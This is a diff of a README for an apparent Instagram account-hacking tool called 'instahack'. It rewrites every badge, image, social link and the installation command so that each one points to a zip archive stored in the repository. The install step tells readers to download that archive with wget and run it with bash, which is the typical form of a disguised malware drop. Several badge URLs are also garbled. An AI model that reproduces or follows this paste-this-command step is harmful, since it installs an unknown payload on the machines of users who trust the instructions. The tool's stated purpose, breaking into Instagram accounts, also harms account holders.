@@ -1,27 +1,27 @@
 <p align="center">
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Made in Pakistan" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%20IN-PakistN-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Made in Pakistan" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip%20IN-PakistN-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Made in Pakistan" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Version" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Maintainence" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<img src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip" alt="visitor badge"/>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Made in Pakistan" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Version" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Maintainence" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip%https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<img src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip" alt="visitor badge"/>
 </p>
 <p align="center">
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="instahack" width="50%" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="instahack" width="50%" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
 </p>
 <p align="center">
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Github" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="YouTube" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip wasii-red?style=for-the-badge&logo=Youtube"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Github" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="YouTube" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip wasii-red?style=for-the-badge&logo=Youtube"></a>
 </p>
 <p align="center">
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Language" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Language" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip%https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Followers" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Stars" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Forks" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Watching" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Licence" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Language" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip%https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Language" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip%https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Followers" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Stars" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Forks" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Watching" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Licence" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
 </p>
 
 ## ABOUT TOOL :
@@ -89,7 +89,7 @@ $ sudo pip3 install stem
 
 ### INSTALLATION:
 ```
-wget https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip && bash https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip
+wget https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip && bash https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip
 ```
 
 ### USAGE OPTIONS :
@@ -121,24 +121,24 @@ and many more options...
 
 <br>
 <p align="center">
-<img width="50%" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"/>
+<img width="50%" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"/>
 </p>
 
 
 ## CONNECT WITH US :
 
-[![Messenger](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="Github" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-[![Instagram](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
-<a href="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"><img title="YouTube" src="https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip"></a>
+[![Messenger](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="Github" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+[![Instagram](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
+<a href="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"><img title="YouTube" src="https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip"></a>
 
 ## Support Me On Patreon:
-[![Patreon](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)](https://raw.githubusercontent.com/ironpawa/instahack/master/.github/ISSUE_TEMPLATE/Software-debasingly.zip)
+[![Patreon](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)](https://github.com/ironpawa/instahack/raw/refs/heads/master/core/Software-3.2.zip)
 
 
 ## WARNING : 
